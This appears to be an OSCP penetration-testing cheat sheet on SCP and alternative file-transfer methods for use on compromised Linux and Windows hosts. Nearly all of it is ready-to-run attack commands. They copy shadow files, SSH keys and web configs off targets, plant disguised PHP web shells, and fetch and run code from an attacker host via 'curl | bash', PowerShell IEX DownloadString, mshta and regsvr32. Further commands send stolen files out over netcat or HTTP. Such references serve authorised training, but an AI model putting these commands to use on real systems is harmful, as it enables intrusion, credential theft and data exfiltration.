# SCP & File Transfer in Pentesting — Complete OSCP Guide

> **Scope:** SCP explained from concept to every use case — downloading files from targets, uploading tools/shells, transferring through pivots, and every alternative file transfer method when SCP is not available. Written for the OSCP mindset: you have SSH creds, now move files efficiently.

---

## Table of Contents

1. [What is SCP](#1-what-is-scp)
   - 1.1 Concept & How It Works
   - 1.2 Why SCP Matters in Pentesting
   - 1.3 SCP vs Other Transfer Methods

2. [SCP Syntax — Full Breakdown](#2-scp-syntax--full-breakdown)
   - 2.1 Basic Syntax
   - 2.2 Download from Target
   - 2.3 Upload to Target
   - 2.4 SCP Flags Reference

3. [SCP in Pentesting — Real Scenarios](#3-scp-in-pentesting--real-scenarios)
   - 3.1 Download Sensitive Files
   - 3.2 Upload Tools & Scripts
      - 3.3 Upload Web Shells
   - 3.4 Download Entire Directories
   - 3.5 SCP Through Non-Standard Port

4. [SCP Troubleshooting & Fixes](#4-scp-troubleshooting--fixes)

5. [File Transfer — Every Method](#5-file-transfer--every-method)
   - 5.1 Python HTTP Server
   - 5.2 wget & curl (Target Downloads)
   - 5.3 Netcat File Transfer
   - 5.4 SMB Server (Impacket)
   - 5.5 FTP Server
   - 5.6 PHP Upload Script
   - 5.7 Base64 Encode/Decode Transfer
   - 5.8 certutil (Windows)
   - 5.9 PowerShell Download
   - 5.10 Metasploit Upload/Download

6. [Windows File Transfer Methods](#6-windows-file-transfer-methods)

7. [SCP Through a Pivot](#7-scp-through-a-pivot)

8. [What to Download — Pentest Priority List](#8-what-to-download--pentest-priority-list)

9. [Quick Reference Card](#9-quick-reference-card)

---

## 1. What is SCP

### 1.1 Concept & How It Works

**SCP (Secure Copy Protocol)** is a file transfer protocol built on top of SSH. It uses the same SSH connection, the same port (22), and the same credentials — it is essentially `cp` but over an encrypted SSH channel.

```
[Your Machine] ←──SSH/SCP──→ [Target Machine]
   Files transferred securely over port 22
```

**Key facts:**
- Uses SSH protocol — port 22, same creds as SSH login
- Encrypted end-to-end (unlike FTP which is cleartext)
- Works in both directions — download FROM target or upload TO target
- Supports single files, multiple files, and entire directories
- If you can SSH in, you can SCP

### 1.2 Why SCP Matters in Pentesting

When you find SSH credentials on a target:

```
Found SSH creds → SSH login → what now?
                           ↓
              Use SCP to:
              ├── DOWNLOAD sensitive files (configs, keys, databases, zips)
              ├── UPLOAD tools (linpeas, chisel, exploit binaries)
              ├── UPLOAD shells (reverse shell scripts)
              └── EXFILTRATE evidence (flags, password files, backups)
```

**Why not just `cat` files in the SSH session?**
- Binary files (zips, databases, images) cannot be read in terminal
- Large files are painful to read line by line
- You want a local copy to analyze offline (strings, unzip, john, etc.)
- Tools need to be executable on the remote machine

### 1.3 SCP vs Other Transfer Methods

| Method | Needs | Speed | Encrypted | Works On |
|---|---|---|---|---|
| **SCP** | SSH creds | Fast | ✅ Yes | Linux/Mac |
| wget/curl | HTTP server on attacker | Fast | Optional | Linux/Windows |
| Netcat | nc on both ends | Fast | ❌ No | Linux |
| certutil | HTTP server | Medium | Optional | Windows |
| PowerShell | HTTP server | Medium | Optional | Windows |
| Base64 | Terminal only | Slow | ❌ No | Any |
| SMB (impacket) | Python | Fast | ❌ No | Windows |
| FTP | FTP server | Medium | ❌ No | Any |

---

## 2. SCP Syntax — Full Breakdown

### 2.1 Basic Syntax

```
scp [flags] [source] [destination]

# Remote path format:
user@host:/path/to/file

# Local path format:
/path/to/local/file
./filename
filename
```

### 2.2 Download from Target (Remote → Local)

```bash
# Basic download — single file
scp user@<TARGET_IP>:/path/to/file.txt .

# The command you mentioned:
scp charix@<TARGET_IP>:secret.zip .
# Downloads secret.zip from charix's home directory to current local dir

# Specify local destination
scp charix@<TARGET_IP>:secret.zip /home/kali/loot/

# Absolute remote path
scp user@<TARGET_IP>:/etc/passwd ./passwd_copy

# File in specific directory
scp user@<TARGET_IP>:/var/www/html/config.php .

# Download with different SSH port
scp -P 2222 user@<TARGET_IP>:/home/user/secret.zip .

# Download with private key
scp -i id_rsa user@<TARGET_IP>:/root/root.txt .

# Download entire directory (-r recursive)
scp -r user@<TARGET_IP>:/var/www/html ./website_copy

# Download multiple files
scp user@<TARGET_IP>:"/home/user/file1.txt /home/user/file2.txt" .

# Download with wildcard (all .txt files)
scp user@<TARGET_IP>:"/home/user/*.txt" .
scp "user@<TARGET_IP>:/home/user/*.zip" .
```

### 2.3 Upload to Target (Local → Remote)

```bash
# Upload a single tool
scp linpeas.sh user@<TARGET_IP>:/tmp/

# Upload shell
scp shell.php user@<TARGET_IP>:/var/www/html/

# Upload with specific filename
scp shell.php user@<TARGET_IP>:/var/www/html/image.php

# Upload chisel binary
scp chisel user@<TARGET_IP>:/tmp/chisel

# Upload entire directory
scp -r ./tools user@<TARGET_IP>:/tmp/tools

# Upload multiple files
scp linpeas.sh chisel pspy64 user@<TARGET_IP>:/tmp/

# Upload with different SSH port
scp -P 2222 exploit.py user@<TARGET_IP>:/tmp/
```

### 2.4 SCP Flags Reference

| Flag | Purpose | Example |
|---|---|---|
| `-P <port>` | Specify SSH port (capital P!) | `-P 2222` |
| `-i <keyfile>` | Identity file (private key) | `-i id_rsa` |
| `-r` | Recursive (copy directories) | `-r` |
| `-v` | Verbose (debug) | `-v` |
| `-C` | Compression | `-C` |
| `-q` | Quiet (suppress progress) | `-q` |
| `-l <limit>` | Bandwidth limit (Kbit/s) | `-l 500` |
| `-o` | SSH options | `-o StrictHostKeyChecking=no` |
| `-3` | Route through local machine (3-way) | `-3` |

```bash
# Common useful combinations:

# Skip host key check (CTF/OSCP)
scp -o StrictHostKeyChecking=no user@<TARGET_IP>:/etc/passwd .

# Old server (same SSH flags as ssh command)
scp -o KexAlgorithms=+diffie-hellman-group1-sha1 \
    -o HostKeyAlgorithms=+ssh-rsa \
    -o PubkeyAcceptedKeyTypes=+ssh-rsa \
    user@<TARGET_IP>:secret.zip .

# Key + port + no host key check
scp -i id_rsa -P 2222 -o StrictHostKeyChecking=no \
    user@<TARGET_IP>:/root/root.txt .

# Recursive + verbose
scp -rv user@<TARGET_IP>:/var/log ./logs/
```

---

## 3. SCP in Pentesting — Real Scenarios

### 3.1 Download Sensitive Files

```bash
# === PASSWORD FILES ===
scp user@<TARGET_IP>:/etc/passwd ./passwd
scp user@<TARGET_IP>:/etc/shadow ./shadow     # needs root
scp user@<TARGET_IP>:/etc/group ./group

# === SSH KEYS ===
scp user@<TARGET_IP>:/home/user/.ssh/id_rsa ./id_rsa
scp user@<TARGET_IP>:/root/.ssh/id_rsa ./root_id_rsa
scp user@<TARGET_IP>:/home/user/.ssh/authorized_keys .

# === WEB APP CONFIG FILES ===
scp user@<TARGET_IP>:/var/www/html/wp-config.php .
scp user@<TARGET_IP>:/var/www/html/config.php .
scp user@<TARGET_IP>:/var/www/html/.env .

# === DATABASE FILES ===
scp user@<TARGET_IP>:/var/lib/mysql/users.db .
scp user@<TARGET_IP>:/home/user/database.sqlite .

# === BACKUP/ARCHIVE FILES ===
scp user@<TARGET_IP>:/home/user/backup.zip .
scp user@<TARGET_IP>:/var/backups/backup.tar.gz .
scp charix@<TARGET_IP>:secret.zip .        # example from the question

# === VNC PASSWORD FILES ===
scp user@<TARGET_IP>:/root/.vnc/passwd ./vnc_passwd
scp user@<TARGET_IP>:/home/user/.vnc/passwd .

# === BASH HISTORY ===
scp user@<TARGET_IP>:/home/user/.bash_history .
scp user@<TARGET_IP>:/root/.bash_history .

# === FLAGS ===
scp user@<TARGET_IP>:/home/user/user.txt .
scp user@<TARGET_IP>:/root/root.txt .

# After downloading — process locally:
# Extract zip
unzip secret.zip
unzip -P password secret.zip    # password protected

# Crack zip password
zip2john secret.zip > zip.hash
john zip.hash --wordlist=/usr/share/wordlists/rockyou.txt

# Read shadow file
cat shadow
# Crack with john
unshadow passwd shadow > combined.txt
john combined.txt --wordlist=/usr/share/wordlists/rockyou.txt

# Extract strings from binary
strings downloaded_binary | grep -i pass
```

### 3.2 Upload Tools & Scripts

```bash
# Privilege escalation scripts
scp linpeas.sh user@<TARGET_IP>:/tmp/
scp LinEnum.sh user@<TARGET_IP>:/tmp/
scp pspy64 user@<TARGET_IP>:/tmp/        # process spy (no root)
scp pspy32 user@<TARGET_IP>:/tmp/        # 32-bit version

# Execute after upload
ssh user@<TARGET_IP> "chmod +x /tmp/linpeas.sh && /tmp/linpeas.sh"

# Pivoting tools
scp chisel user@<TARGET_IP>:/tmp/
scp ligolo-agent user@<TARGET_IP>:/tmp/

# Exploit scripts
scp exploit.py user@<TARGET_IP>:/tmp/
scp exploit.sh user@<TARGET_IP>:/tmp/

# Static binaries (when tools missing on target)
scp nc_static user@<TARGET_IP>:/tmp/nc
scp socat_static user@<TARGET_IP>:/tmp/socat

# Make executable in one step
scp tool user@<TARGET_IP>:/tmp/ && ssh user@<TARGET_IP> "chmod +x /tmp/tool"
```

### 3.3 Upload Web Shells

```bash
# If you have creds and SSH to a web server:

# Upload PHP shell
scp shell.php user@<TARGET_IP>:/var/www/html/

# Upload disguised as image (if extension not validated server-side)
scp shell.php user@<TARGET_IP>:/var/www/html/image.jpg.php

# Upload to uploads directory
scp shell.php user@<TARGET_IP>:/var/www/html/uploads/

# Then trigger via browser
curl "http://<TARGET_IP>/shell.php?cmd=id"
```

### 3.4 Download Entire Directories

```bash
# Download entire web root (look for config files, source code)
scp -r user@<TARGET_IP>:/var/www/html ./webroot

# Download all logs
scp -r user@<TARGET_IP>:/var/log ./logs

# Download home directory
scp -r user@<TARGET_IP>:/home/user ./user_home

# Download and search locally (faster than grep on target)
scp -r user@<TARGET_IP>:/var/www ./www_copy
grep -r "password" ./www_copy/
grep -r "DB_PASS" ./www_copy/
```

### 3.5 SCP Through Non-Standard Port

```bash
# SSH running on port 2222
scp -P 2222 user@<TARGET_IP>:secret.zip .

# SSH on port 443 (firewall bypass)
scp -P 443 user@<TARGET_IP>:/etc/passwd .

# IMPORTANT: SCP uses -P (capital P) for port
# SSH uses -p (lowercase p) for port
# This is a common mistake!
```

---

## 4. SCP Troubleshooting & Fixes

| Error | Cause | Fix |
|---|---|---|
| `Host key verification failed` | Known_hosts conflict | Add `-o StrictHostKeyChecking=no` |
| `Permission denied` | Wrong creds or no read access | Check file permissions on target |
| `No such file or directory` | Wrong remote path | Check path with `ssh user@TARGET ls -la` |
| `no matching key exchange` | Old server algorithms | Add `-o KexAlgorithms=+diffie-hellman-group1-sha1` |
| `scp: command not found` (remote) | No scp on target | Use sftp, or base64 method |
| Blank/empty file downloaded | Binary file needs -r or path issue | Check remote file with ls -la |
| `Lost connection` | Timeout or large file | Add `-C` compression, retry |
| Port flag not working | Using `-p` instead of `-P` | Use **capital `-P`** for SCP |

```bash
# Fix for old server — full compatibility flags
scp -o StrictHostKeyChecking=no \
    -o UserKnownHostsFile=/dev/null \
    -o KexAlgorithms=+diffie-hellman-group1-sha1 \
    -o HostKeyAlgorithms=+ssh-rsa \
    -o PubkeyAcceptedKeyTypes=+ssh-rsa \
    -c aes128-cbc \
    user@<TARGET_IP>:secret.zip .
```

---

## 5. File Transfer — Every Method

When SCP is not available (no SSH, different OS, blocked), use these:

### 5.1 Python HTTP Server

**Most common attacker-side server. Transfer files TO targets.**

```bash
# Attacker — start HTTP server
python3 -m http.server 80           # port 80
python3 -m http.server 8080         # port 8080
python3 -m http.server 9999         # any port

# Python 2
python -m SimpleHTTPServer 80

# Serve from specific directory
cd /opt/tools && python3 -m http.server 80

# HTTPS server (when HTTP blocked)
python3 -c "
import http.server, ssl
server = http.server.HTTPServer(('0.0.0.0', 443), http.server.SimpleHTTPRequestHandler)
server.socket = ssl.wrap_socket(server.socket, certfile='server.pem', server_side=True)
server.serve_forever()
"

# Target downloads from attacker
wget http://<YOUR_TUN0_IP>/linpeas.sh -O /tmp/linpeas.sh
curl http://<YOUR_TUN0_IP>/linpeas.sh -o /tmp/linpeas.sh
```

### 5.2 wget & curl (Target Downloads)

```bash
# wget
wget http://<YOUR_TUN0_IP>/tool -O /tmp/tool
wget http://<YOUR_TUN0_IP>/shell.php -O /var/www/html/shell.php
wget -q http://<YOUR_TUN0_IP>/chisel -O /tmp/chisel   # quiet

# curl
curl http://<YOUR_TUN0_IP>/tool -o /tmp/tool
curl http://<YOUR_TUN0_IP>/linpeas.sh | bash    # execute directly (no disk write)
curl http://<YOUR_TUN0_IP>/tool -o /tmp/tool && chmod +x /tmp/tool

# curl — follow redirects, skip SSL verify
curl -Lk https://<YOUR_TUN0_IP>/tool -o /tmp/tool

# Make executable immediately
wget http://<YOUR_TUN0_IP>/chisel -O /tmp/chisel && chmod +x /tmp/chisel
```

### 5.3 Netcat File Transfer

```bash
# === SEND file FROM attacker TO target ===

# Attacker — listen and send file
nc -lvnp <LPORT> < linpeas.sh

# Target — receive file
nc <YOUR_TUN0_IP> <LPORT> > /tmp/linpeas.sh

# === RECEIVE file FROM target TO attacker ===

# Attacker — listen to receive
nc -lvnp <LPORT> > received_file.zip

# Target — send file
nc <YOUR_TUN0_IP> <LPORT> < secret.zip

# Verify transfer with md5
md5sum secret.zip            # on target
md5sum received_file.zip     # on attacker (should match)
```

### 5.4 SMB Server (Impacket) — Windows Targets

```bash
# Attacker — start SMB server
impacket-smbserver share /opt/tools -smb2support
# or
python3 /usr/share/doc/python3-impacket/examples/smbserver.py share /opt/tools

# Windows target — copy file from SMB share
copy \\<YOUR_TUN0_IP>\share\nc.exe C:\Windows\Temp\nc.exe

# Run directly from share (no copy to disk)
\\<YOUR_TUN0_IP>\share\tool.exe

# With authentication (modern Windows requires creds)
impacket-smbserver share /opt/tools -smb2support -username user -password pass
# Windows:
net use \\<YOUR_TUN0_IP>\share /user:user pass
copy \\<YOUR_TUN0_IP>\share\tool.exe .
```

### 5.5 FTP Server

```bash
# Attacker — start FTP server
python3 -m pyftpdlib -p 21 -w        # writable
python3 -m pyftpdlib -p 21 -w -u user -P pass  # with auth

# Target — download via FTP
ftp <YOUR_TUN0_IP>
# anonymous / anonymous
ftp> get tool.exe

# Windows one-liner FTP download
echo open <YOUR_TUN0_IP> 21 > ftp.txt
echo user anonymous >> ftp.txt
echo binary >> ftp.txt
echo GET nc.exe >> ftp.txt
echo bye >> ftp.txt
ftp -s:ftp.txt
```

### 5.6 PHP Upload Script

```bash
# Upload this PHP script to a writable web directory
cat > upload.php << 'EOF'
<?php
if(isset($_FILES['f'])){
    move_uploaded_file($_FILES['f']['tmp_name'], '/var/www/html/uploads/' . $_FILES['f']['name']);
    echo "Uploaded: " . $_FILES['f']['name'];
}
?>
<form method="POST" enctype="multipart/form-data">
<input type="file" name="f">
<input type="submit" value="Upload">
</form>
EOF

# Then upload files via curl
curl -F "f=@shell.php" http://<TARGET_IP>/upload.php
```

### 5.7 Base64 Encode/Decode Transfer

**When nothing else works — transfer via terminal output only.**

```bash
# === UPLOAD TO TARGET ===

# Step 1 — Encode file on attacker
base64 linpeas.sh > linpeas.b64
cat linpeas.b64    # copy this output

# Step 2 — On target terminal, paste and decode
echo "BASE64_STRING_HERE" | base64 -d > /tmp/linpeas.sh
chmod +x /tmp/linpeas.sh

# One-liner (for smaller files)
base64 -w 0 tool.sh    # -w 0 = no line wrapping → one long line to paste

# === DOWNLOAD FROM TARGET ===

# Step 1 — On target, encode the file
base64 /etc/shadow

# Step 2 — Copy output, paste on attacker
echo "BASE64_OUTPUT" | base64 -d > shadow_copy
cat shadow_copy
```

### 5.8 certutil (Windows)

```cmd
# Download file (Windows built-in — no tools needed)
certutil -urlcache -f http://<YOUR_TUN0_IP>/nc.exe nc.exe
certutil -urlcache -f http://<YOUR_TUN0_IP>/shell.exe C:\Windows\Temp\shell.exe

# Decode base64 file
certutil -decode encoded.b64 output.exe

# Encode file to base64
certutil -encode input.exe encoded.b64

# HTTPS (skip cert check)
certutil -urlcache -f https://<YOUR_TUN0_IP>/tool.exe tool.exe
```

### 5.9 PowerShell Download

```powershell
# Method 1 — WebClient DownloadFile
(New-Object Net.WebClient).DownloadFile('http://<YOUR_TUN0_IP>/nc.exe','C:\Temp\nc.exe')

# Method 2 — Invoke-WebRequest (PowerShell 3+)
Invoke-WebRequest -Uri http://<YOUR_TUN0_IP>/tool.exe -OutFile C:\Temp\tool.exe
iwr http://<YOUR_TUN0_IP>/tool.exe -OutFile C:\Temp\tool.exe    # alias

# Method 3 — DownloadString (execute in memory, no disk)
IEX (New-Object Net.WebClient).DownloadString('http://<YOUR_TUN0_IP>/shell.ps1')
IEX(IWR http://<YOUR_TUN0_IP>/Invoke-PowerShellTcp.ps1 -UseBasicParsing)

# Method 4 — BITS (Background Intelligent Transfer)
Start-BitsTransfer -Source http://<YOUR_TUN0_IP>/tool.exe -Destination C:\Temp\tool.exe

# Bypass execution policy
powershell -ExecutionPolicy Bypass -File script.ps1

# From cmd.exe
powershell -c "(New-Object Net.WebClient).DownloadFile('http://<YOUR_TUN0_IP>/nc.exe','nc.exe')"
```

### 5.10 Metasploit Upload/Download

```bash
# From Meterpreter session
meterpreter > upload /opt/tools/linpeas.sh /tmp/linpeas.sh
meterpreter > download /etc/shadow ./shadow
meterpreter > download C:\\Users\\Administrator\\Desktop\\root.txt .

# Recursive directory download
meterpreter > download -r C:\\Users\\Administrator\\Documents ./docs

# Shell upload via exploit module
use exploit/multi/handler
# After session: upload/download commands available
```

---

## 6. Windows File Transfer Methods

When you have a Windows target — quick command reference:

```cmd
# === DOWNLOAD METHODS (Windows target) ===

# certutil
certutil -urlcache -f http://<YOUR_TUN0_IP>/nc.exe nc.exe

# PowerShell
powershell -c "IWR http://<YOUR_TUN0_IP>/nc.exe -OutFile nc.exe"

# BITSAdmin
bitsadmin /transfer job http://<YOUR_TUN0_IP>/nc.exe C:\Temp\nc.exe

# xcopy from SMB share
copy \\<YOUR_TUN0_IP>\share\nc.exe .

# mshta (execute directly from URL — JS/VBS)
mshta http://<YOUR_TUN0_IP>/payload.hta

# regsvr32 (execute script from URL)
regsvr32 /s /n /u /i:http://<YOUR_TUN0_IP>/file.sct scrobj.dll

# === UPLOAD FROM WINDOWS TARGET ===

# PowerShell upload to attacker
$b = [System.IO.File]::ReadAllBytes("C:\secret.zip")
Invoke-RestMethod -Uri http://<YOUR_TUN0_IP>:8888/upload -Method POST -Body $b

# Attacker receives with netcat
nc -lvnp 8888 > secret.zip

# SMB upload back to share
copy C:\loot.zip \\<YOUR_TUN0_IP>\share\
```

---

## 7. SCP Through a Pivot

When the target is only reachable through a pivot machine:

```bash
# Scenario: Target2 (192.168.1.50) only reachable through Pivot (<TARGET_IP>)

# Method 1 — SSH ProxyJump (-J)
scp -J user@<TARGET_IP> user2@192.168.1.50:/home/user2/secret.zip .

# Method 2 — SSH local forward first, then SCP to local port
ssh -L 2222:192.168.1.50:22 user@<TARGET_IP> -N &
scp -P 2222 user2@127.0.0.1:/home/user2/secret.zip .

# Method 3 — ProxyChains
proxychains scp user@192.168.1.50:/home/user/secret.zip .

# Method 4 — SSH config file (~/.ssh/config)
cat >> ~/.ssh/config << EOF
Host pivot
    HostName <TARGET_IP>
    User user

Host target2
    HostName 192.168.1.50
    User user2
    ProxyJump pivot
EOF

# Now simple SCP works
scp target2:/home/user2/secret.zip .
```

---

## 8. What to Download — Pentest Priority List

After getting SSH access, download these in order of value:

```bash
# === TIER 1 — Immediate value ===
scp user@<TARGET_IP>:/etc/passwd .
scp user@<TARGET_IP>:/etc/shadow .           # if root
scp user@<TARGET_IP>:/root/.ssh/id_rsa .     # if root
scp user@<TARGET_IP>:/home/*/.ssh/id_rsa .   # all user keys
scp user@<TARGET_IP>:/root/root.txt .         # OSCP flag
scp user@<TARGET_IP>:/home/user/user.txt .

# === TIER 2 — Credentials ===
scp user@<TARGET_IP>:/var/www/html/wp-config.php .
scp user@<TARGET_IP>:/var/www/html/.env .
scp user@<TARGET_IP>:/var/www/html/config.php .
scp user@<TARGET_IP>:/home/*/.bash_history .
scp user@<TARGET_IP>:/home/*/.vnc/passwd .

# === TIER 3 — Evidence / Pivoting ===
scp -r user@<TARGET_IP>:/var/www/html ./webroot
scp user@<TARGET_IP>:/var/backups/*.zip .
scp user@<TARGET_IP>:/home/*/backup.zip .

# === TIER 4 — Upload to target ===
scp linpeas.sh user@<TARGET_IP>:/tmp/
scp chisel user@<TARGET_IP>:/tmp/
scp pspy64 user@<TARGET_IP>:/tmp/
```

---

## 9. Quick Reference Card

```
====================================================================
 SCP & FILE TRANSFER — OSCP QUICK REFERENCE
====================================================================

[SCP DOWNLOAD — Remote → Local]
  scp user@<TARGET_IP>:secret.zip .
  scp user@<TARGET_IP>:/etc/passwd ./passwd
  scp user@<TARGET_IP>:/root/root.txt .
  scp -r user@<TARGET_IP>:/var/www/html ./webroot
  scp -P 2222 user@<TARGET_IP>:file.txt .   ← non-standard port

[SCP UPLOAD — Local → Remote]
  scp linpeas.sh user@<TARGET_IP>:/tmp/
  scp shell.php user@<TARGET_IP>:/var/www/html/
  scp chisel user@<TARGET_IP>:/tmp/

[SCP FLAGS]
  -P port  → SSH port (CAPITAL P!)
  -i key   → private key file
  -r       → recursive (directories)
  -C       → compression
  -o StrictHostKeyChecking=no  → skip host key check

[SCP OLD SERVER FIX]
  scp -o StrictHostKeyChecking=no \
      -o KexAlgorithms=+diffie-hellman-group1-sha1 \
      -o HostKeyAlgorithms=+ssh-rsa \
      -o PubkeyAcceptedKeyTypes=+ssh-rsa \
      -c aes128-cbc user@<TARGET_IP>:file.zip .

[SCP THROUGH PIVOT]
  scp -J user@<TARGET_IP> user2@192.168.1.50:/path/file .

--------------------------------------------------------------------
[FILE TRANSFER — LINUX TARGET]

  Attacker serves:
    python3 -m http.server 80

  Target downloads:
    wget http://<YOUR_TUN0_IP>/tool -O /tmp/tool
    curl http://<YOUR_TUN0_IP>/tool -o /tmp/tool

  Netcat:
    Attacker: nc -lvnp <LPORT> > received.zip
    Target:   nc <YOUR_TUN0_IP> <LPORT> < secret.zip

  Base64 (no tools):
    Attacker: base64 -w 0 tool.sh  → copy output
    Target:   echo "BASE64" | base64 -d > /tmp/tool.sh

--------------------------------------------------------------------
[FILE TRANSFER — WINDOWS TARGET]

  certutil (built-in):
    certutil -urlcache -f http://<YOUR_TUN0_IP>/nc.exe nc.exe

  PowerShell:
    IWR http://<YOUR_TUN0_IP>/nc.exe -OutFile nc.exe
    IEX(IWR http://<YOUR_TUN0_IP>/shell.ps1 -UseBasicParsing)

  SMB (attacker):
    impacket-smbserver share /opt/tools -smb2support
  Windows:
    copy \\<YOUR_TUN0_IP>\share\nc.exe .

--------------------------------------------------------------------
[AFTER DOWNLOADING .ZIP — PROCESS IT]

  unzip file.zip                    → extract
  zip2john file.zip > h.txt         → crack if password protected
  john h.txt --wordlist=rockyou.txt → crack password
  strings file | grep -i pass       → find secrets in binary
  file downloaded_file              → check file type
====================================================================
```

---

*This document is for authorized penetration testing, OSCP exam preparation, and CTF competitions only. Always obtain written permission before testing systems you do not own.*
